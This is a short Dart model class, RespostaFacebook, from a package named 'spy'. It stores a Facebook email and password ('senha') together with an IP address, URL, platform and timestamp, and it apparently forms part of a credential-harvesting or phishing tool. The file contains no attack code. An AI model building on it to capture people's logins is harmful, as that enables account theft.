import 'package:spy/src/shared/enums/platforms.dart';
import 'package:spy/src/shared/model/base_resposta_model.dart';

class RespostaFacebook extends BaseRespostaModel {
  String email;
  String senha;

  RespostaFacebook({
    String? ip,
    String? url,
    required this.email,
    required this.senha,
    required Platform platform,
    required DateTime date,
  }) : super(ip: ip, platform: platform, url: url, date: date);
}
